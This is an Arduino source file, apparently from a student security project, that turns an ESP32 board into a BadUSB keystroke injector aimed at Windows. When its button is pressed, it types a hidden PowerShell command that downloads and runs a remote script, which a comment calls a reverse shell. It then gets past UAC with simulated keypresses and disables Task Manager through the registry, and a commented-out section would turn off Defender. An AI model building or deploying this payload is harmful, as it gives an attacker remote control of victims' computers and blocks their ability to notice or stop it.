#include <Arduino.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

const int buttonPin = 0; // Nút BOOT trên mạch Lolin S2 Mini
const int ledPin = 15;   // Đèn LED tích hợp trên mạch Lolin S2 Mini (thường là chân 15)


// Hàm gõ tổ hợp phím an toàn
void pressCombo(uint8_t key1, uint8_t key2) {
  Keyboard.press(key1);
  delay(30);
  Keyboard.press(key2);
  delay(80);
  Keyboard.releaseAll();
  delay(200);
}

// Hàm gõ tổ hợp 3 phím
void pressCombo3(uint8_t key1, uint8_t key2, uint8_t key3) {
  Keyboard.press(key1);
  delay(20);
  Keyboard.press(key2);
  delay(20);
  Keyboard.press(key3);
  delay(100);
  Keyboard.releaseAll();
  delay(300);
}

// Hàm gõ text an toàn
void typeText(const char* text) {
  Keyboard.print(text);
  delay(100);
}

// Hàm mở Run và gõ lệnh
void openRun(const char* command) {
  pressCombo(KEY_LEFT_GUI, 'r');
  delay(500);
  typeText(command);
  delay(300);
}

void setup() {
  pinMode(buttonPin, INPUT_PULLUP);
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, LOW); // Tắt LED ban đầu

  // Khởi động cổng Serial để ghi log (Tốc độ baud: 115200)
  Serial.begin(115200);
  
  // Khởi động Bàn phím ảo
  Keyboard.begin();
  USB.begin();

  // Đợi một chút để cổng Serial ổn định
  delay(3000);
  Serial.println("\n--- HỆ THỐNG BADUSB ĐÃ SẴN SÀNG ---");
  Serial.println("[LOG] Chờ nhấn nút BOOT để bắt đầu tấn công...");
}


void loop() {
  if (digitalRead(buttonPin) == LOW) {
    delay(300); // Chống rung phím
    digitalWrite(ledPin, HIGH); // Bật LED báo hiệu đang chạy

    Serial.println("\n[LOG] BẮT ĐẦU CHUỖI THỰC THI PAYLOAD!");

    // ==========================================
    // BƯỚC 1: ẨN CỬA SỔ
    // ==========================================
    Serial.println("[LOG] Bước 1/6: Đang thu nhỏ các cửa sổ (Win + D)...");
    delay(1000);
    pressCombo(KEY_LEFT_GUI, 'd');
    delay(1000);


    // // ==========================================
    // // Tắt virus Defender (nếu cần, có thể bỏ qua bước này nếu không muốn tắt Defender)
    // // ==========================================

    // // Mở Run
    // pressCombo(KEY_LEFT_GUI, 'r');
    // delay(800);
    
    // // Mở Windows Security bằng lệnh
    // typeText("ms-settings:windowsdefender");
    // delay(200);
    // Keyboard.press(KEY_RETURN);
    // delay(50);
    // Keyboard.releaseAll();
    // delay(3000);  // Chờ mở
    
    // // Tab đến Virus & threat protection
    // Keyboard.press(KEY_TAB);
    // delay(50);
    // Keyboard.releaseAll();
    // delay(150);

    
    // Keyboard.press(KEY_RETURN);
    // delay(50);
    // Keyboard.releaseAll();
    // delay(2000);
    
    // // Tab đến Manage settings
    // for(int i = 0; i < 4; i++) {
    //   Keyboard.press(KEY_TAB);
    //   delay(50);
    //   Keyboard.releaseAll();
    //   delay(150);
    // }
    
    // Keyboard.press(KEY_RETURN);
    // delay(50);
    // Keyboard.releaseAll();
    // delay(1500);
    
    // // Tắt Real-time protection
    // Keyboard.press(' ');
    // delay(50);
    // Keyboard.releaseAll();
    // delay(2500);
    
    // // Xử lý UAC
    // Keyboard.press(KEY_LEFT_ALT);
    // delay(50);
    // Keyboard.press('y');
    // delay(100);
    // Keyboard.releaseAll();
    // delay(2000);
    
    // // Đóng
    // pressCombo(KEY_LEFT_ALT, KEY_F4);
    // delay(800);
    // pressCombo(KEY_LEFT_ALT, KEY_F4);
    // delay(800);

    // ==========================================
    // BƯỚC 2: MỞ HỘP THOẠI RUN
    // ==========================================
    Serial.println("[LOG] Bước 2/6: Đang mở hộp thoại Run (Win + R)...");
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(50);
    Keyboard.releaseAll();
    delay(200);

    // ==========================================
    // BƯỚC 3: GÕ LỆNH POWERSHELL
    // ==========================================
    Serial.println("[LOG] Bước 3/6: Đang nhập mã độc PowerShell...");
    // Nhớ thay <LINK> bằng đường dẫn tải file ps.ps1 của bạn
    // Đã thay đổi: Dùng -w h để cửa sổ bốc hơi ngay lập tức khi vừa mở lên

    //Mở reverse shell về máy tấn công (thay đổi IP và Port nếu cần)
    Keyboard.print("powershell -w h -NoP -Ep Bypass -Command \"irm https://raw.githubusercontent.com/Sunlaii/ANM-Esp32BadUSB/refs/heads/khangpham/src/main.ps1 | iex\"");
    //Keyboard.print("powershell -w h -NoP -Ep Bypass -Command \"irm https://raw.githubusercontent.com/Sunlaii/ANM-Esp32BadUSB/refs/heads/MinhNhat/src/ps.ps1 | iex\"");
    delay(1000);

 


    // ==========================================
    // BƯỚC 4: KÍCH HOẠT QUYỀN ADMIN
    // ==========================================
    Serial.println("[LOG] Bước 4/6: Đang nhấn Ctrl+Shift+Enter để gọi quyền Admin...");
    pressCombo3(KEY_LEFT_CTRL, KEY_LEFT_SHIFT, KEY_RETURN);
    delay(800);

    // ==========================================
    // BƯỚC 5: VƯỢT QUA UAC
    // ==========================================
    Serial.println("[LOG] Bước 5/6: Đang chờ bảng UAC hiện lên (Đợi 2.5s)...");
    
    Serial.println("[LOG] Bước 5/6: Đang nhấn ALT + Y để vượt qua UAC...");
    Keyboard.press(KEY_LEFT_ALT);
    delay(30);
    Keyboard.press('y');
    delay(100);
    Keyboard.releaseAll();
    delay(1500);
    
    // ==========================================
    // NGĂN BẬT TASK MANAGER 
    // ==========================================
    // Mở Run
    pressCombo(KEY_LEFT_GUI, 'r');
    delay(600);
    
    // Mở PowerShell
    typeText("powershell");
    delay(300);
    
    // Chạy PowerShell với quyền admin
    pressCombo3(KEY_LEFT_CTRL, KEY_LEFT_SHIFT, KEY_RETURN);
    delay(1500); // Chờ PowerShell admin mở
    
    // Xử lý UAC
    Keyboard.press(KEY_LEFT_ALT);
    delay(30);
    Keyboard.press('y');
    delay(100);
    Keyboard.releaseAll();
    delay(2000);

    // Gõ lệnh disable Task Manager
    typeText("New-Item -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Force | Out-Null; Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableTaskMgr\" -Value 1");
    delay(300);
    
    Keyboard.press(KEY_RETURN);
    delay(50);
    Keyboard.releaseAll();
    delay(1500);
    
    // Đóng PowerShell
    // Thay vì ALT+F4, gõ lệnh exit
    typeText("exit");
    delay(200);
    Keyboard.press(KEY_RETURN);
    delay(50);
    Keyboard.releaseAll();
    delay(500);


    // ==========================================
    // BƯỚC 6: BÁO HIỆU HOÀN TẤT
    // ==========================================
    Serial.println("[LOG] Bước 6/6: Kịch bản đã gõ xong! Chờ file tải về (Nháy Caps Lock)...");
    
    for(int i = 0; i < 4; i++) {
      Keyboard.press(KEY_CAPS_LOCK); delay(50); Keyboard.releaseAll();
      delay(250); 
      Keyboard.press(KEY_CAPS_LOCK); delay(50); Keyboard.releaseAll();
      delay(250); 
    }
    //nháy liên tục đèn trên esp
    /*while(true) {
      digitalWrite(ledPin, HIGH);
      delay(250);
      digitalWrite(ledPin, LOW);
      delay(250);
    }*/

    Serial.println("[LOG] === HOÀN TẤT CUỘC TẤN CÔNG ===");
    Serial.println("[LOG] Bạn có thể rút USB ra ngay bây giờ.");
    digitalWrite(ledPin, LOW); // Tắt đèn LED mạch
    // Chờ nhả nút để tránh chạy lặp lại
    while(digitalRead(buttonPin) == LOW) delay(10);
  }
}